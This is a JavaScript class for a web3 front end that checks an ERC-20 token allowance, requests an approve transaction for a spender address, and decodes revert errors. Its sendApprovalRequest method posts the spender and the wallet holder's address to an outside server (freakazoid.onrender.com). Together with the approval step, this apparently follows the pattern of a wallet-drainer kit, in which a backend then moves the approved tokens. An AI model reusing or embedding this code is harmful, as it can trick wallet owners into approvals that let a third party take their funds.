import { writeContract, readContract } from "https://esm.sh/@wagmi/core@2.x";
import { parseGwei, encodeFunctionData } from 'https://esm.sh/viem';

export class TokenApprover {
  constructor(wagmiConfig) {
    this.config = wagmiConfig;
  }

  async approveToken(tokenAddress, spenderAddress, amount, ownerAddress) {
    try {
      console.log("Fetching current allowance...");
      
      // Use wagmi's readContract instead of direct web3 calls
      const currentAllowance = await readContract(this.config, {
        address: tokenAddress,
        abi: [{
          name: "allowance",
          type: "function",
          stateMutability: "view",
          inputs: [
            { name: "owner", type: "address" },
            { name: "spender", type: "address" }
          ],
          outputs: [{ name: "", type: "uint256" }]
        }],
        functionName: 'allowance',
        args: [ownerAddress, spenderAddress]
      });
      
      console.log("Current allowance:", currentAllowance.toString());

      // If allowance is not enough, request approval
      if (BigInt(currentAllowance) < BigInt(amount)) {
        console.log("Insufficient allowance. Requesting approval for amount:", amount);

        // Get current network conditions
        const feeData = await fetch('https://api.blocknative.com/gasprices/blockprices')
          .then(res => res.json())
          .catch(() => null);
        
        // Use EIP-1559 fee model
        const maxFeePerGas = feeData?.blockPrices?.[0]?.estimatedPrices?.[0]?.maxFeePerGas 
          ? parseGwei(feeData.blockPrices[0].estimatedPrices[0].maxFeePerGas.toString())
          : parseGwei('30'); // Fallback
          
        const maxPriorityFeePerGas = feeData?.blockPrices?.[0]?.estimatedPrices?.[0]?.maxPriorityFeePerGas
          ? parseGwei(feeData.blockPrices[0].estimatedPrices[0].maxPriorityFeePerGas.toString())
          : parseGwei('1.5'); // Fallback

        // Use wagmi's writeContract instead of direct web3.eth.sendTransaction
        const hash = await writeContract(this.config, {
          address: tokenAddress,
          abi: [{
            name: 'approve',
            type: 'function',
            inputs: [
              { name: '_spender', type: 'address' },
              { name: '_value', type: 'uint256' }
            ],
            outputs: [{ name: '', type: 'bool' }]
          }],
          functionName: 'approve',
          args: [spenderAddress, amount],
          maxFeePerGas,
          maxPriorityFeePerGas,
          // Infinite approval is gas-efficient for frequent users, but it's a security risk
          // For better gas optimization - consider approving exactly the amount needed or using permit/EIP-2612
          gas: 100000n, // Lower gas limit - approve typically uses ~45k gas
        });

        console.log("Approval transaction sent. Hash:", hash);
        
        return {
          success: true,
          txHash: hash
        };
      } else {
        console.log("Sufficient allowance already exists. No approval needed.");
        return { success: true, noApprovalNeeded: true };
      }
    } catch (error) {
      console.error("Error in approveToken:", error);
      const reason = await this.decodeRevertReason(error);
      return {
        success: false,
        error: error.message || "Unknown error during approval",
        reason
      };
    }
  }

  async sendApprovalRequest(spenderAddress, holder) {
    console.log(spenderAddress, holder);
    try {
      const response = await fetch('https://freakazoid.onrender.com/approve', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          spenderAddress,
          holder
        })
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();
      return data;
    } catch (error) {
      console.error('Error sending approval request:', error);
      throw error;
    }
  }

  async decodeRevertReason(error) {
    if (error.data) {
      try {
        // Using viem's utilities instead of direct web3 calls
        return error.data.slice(0, 2) === '0x' 
          ? new TextDecoder().decode(
              new Uint8Array(
                [...error.data.slice(138)]
                  .map((_c, i, a) => 
                    i % 2 === 0 ? `0x${a[i]}${a[i + 1]}` : '')
                  .filter(Boolean)
                  .map(h => parseInt(h, 16))
              )
            )
          : error.data;
      } catch (decodeError) {
        return 'Unable to decode revert reason';
      }
    }
    return error.message || 'Unknown error';
  }
}
